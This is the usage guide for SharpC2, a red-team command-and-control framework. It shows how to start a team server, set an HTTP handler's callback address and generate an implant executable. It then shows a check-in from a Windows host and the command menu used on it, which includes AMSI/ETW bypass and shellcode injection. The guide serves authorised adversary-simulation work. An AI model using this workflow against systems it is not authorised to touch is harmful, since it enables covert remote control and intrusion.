# Basic Usage

## Start the Team Server

Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root/admin if you want to bind handlers to low ports (e.g. port 80 for the HTTP handler).


```text
rasta@dev ~/S/T/b/R/n/o/publish (main)> sudo ./TeamServer -p Passw0rd!
info: Microsoft.Hosting.Lifetime[14]
      Now listening on: https://0.0.0.0:8443
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Production
info: Microsoft.Hosting.Lifetime[0]
      Content root path: /Users/rasta/SharpC2/TeamServer/bin/Release/net6.0/osx-x64/publish
```

The team server will listen for user connections on port 8443 by default.  This can be changed in `appsettings.json`.
If the `ASPNETCORE_ENVIRONMENT` environment variable is set to `Development`, the team server's management interface will be bound to localhost only.  Set this to `Production` to have it listen on all interfaces.

## Start the Client

The client requires several command line options including `-s` (--server), `-p` (--port), `-n` (--nick) and `-P` (--password). You'll be prompted to accept the server's self-signed certificate unless `-i` (--ignore-ssl) is used.

```text
rasta@dev ~/S/C/b/R/n/o/publish (main)> ./SharpC2 -s localhost -p 8443 -n rasta -P Passw0rd! -i
  ___ _                   ___ ___ 
 / __| |_  __ _ _ _ _ __ / __|_  )
 \__ \ ' \/ _` | '_| '_ \ (__ / / 
 |___/_||_\__,_|_| | .__/\___/___|
                   |_|            
    @_RastaMouse                  
    @_xpn_                        


[drones] >
```

## Configure and Start a Handler

In SharpC2, "handlers" are akin to listeners in other frameworks.  SharpC2 handlers can do more than just "listen" for incoming data, which is why I elected to use different terminology.

The `[drones]` screen is the default for the client.  You can type `help` on any screen to see commands contextual to that screen.

```text
[drones] > help

Name          Description
----          -----------
credentials   Manage credentials
exit          Exit this client
handlers      Manage Handlers
help          Print a list of commands and their description
hide          Hide an inactive Drone.
hosted-files  Manage hosted files
interact      Interact with a Drone
list          List Drones
payload       Generate a payload
```

SharpC2 ships with three handler types. HTTP, TCP and SMB.  Use the `create` command to create a new handler.
`Usage: create <name> <type>`.

```text
[handlers] > create demo-http HTTP
[+] Handler "demo-http" created.
```

Use the `set` command to set parameters for a handler.
`Usage: set <handler> <parameter> <value>`.

```text
[handlers] > set demo-http ConnectAddress 192.168.1.105
[+] ConnectAddress set to 192.168.1.105
```

A handler can then be started and stopped using the `start` and `stop` commands respectively.

```text
[handlers] > start demo-http
[+] Handler "demo-http" started.

[handlers] > stop demo-http
[+] Handler "demo-http" stopped.
```

## Generate a Payload

Payloads can be generated from the `[drones]` screen, using the `payload` command.

```text
[drones] > payload demo-http Exe /tmp/http-drone.exe
[+] 164352 bytes saved.
```

## Interacting with Drones

```text
[+] Drone a47153bd55 checked in from IEUser@MSEDGEWIN10.

[drones] > list

Guid        Parent  Address      Hostname     Username  Process     Pid   Integrity  Arch  LastSeen
----        ------  -------      --------     --------  -------     ---   ---------  ----  --------
a47153bd55  -       10.211.55.6  MSEDGEWIN10  IEUser    http-drone  7860  Medium     x64   18/12/2021 17:30:16
```

To interact with a Drone, use `interact <guid>`.

```text
[drones] > interact a47153bd55
[a47153bd55] > help

Name              Description
----              -----------
abort             Abort a running task
back              Go back to the previous screen
bypass            Set a directive to bypass AMSI/ETW on tasks
cat               Read a file as text
cd                Change working directory
execute-assembly  Execute a .NET assembly
exit              Exit this Drone
getuid            Get current identity
help              Print a list of commands and their description
link              Link to an SMB Drone
load-module       Load an external Drone module
ls                List filesystem
mkdir             Create a directory
overload          Map and execute a native DLL
ps                List running processes
pwd               Print working directory
rm                Delete a file
rmdir             Delete a directory
run               Run a command
services          List services on the current or target machine
shell             Run a command via cmd.exe
shinject          Inject arbitrary shellcode into a process
sleep             Set sleep interval and jitter
upload            Upload a file to the current working directory of the Drone
```

```text
[a47153bd55] > getuid
[+] Tasked Drone to run getuid.
[+] Drone checked in.  Sent 176 bytes.
[+] Drone task 57582950c7 is running.

GHOST-CANYON\Daniel

[+] Drone task 57582950c7 has completed.
```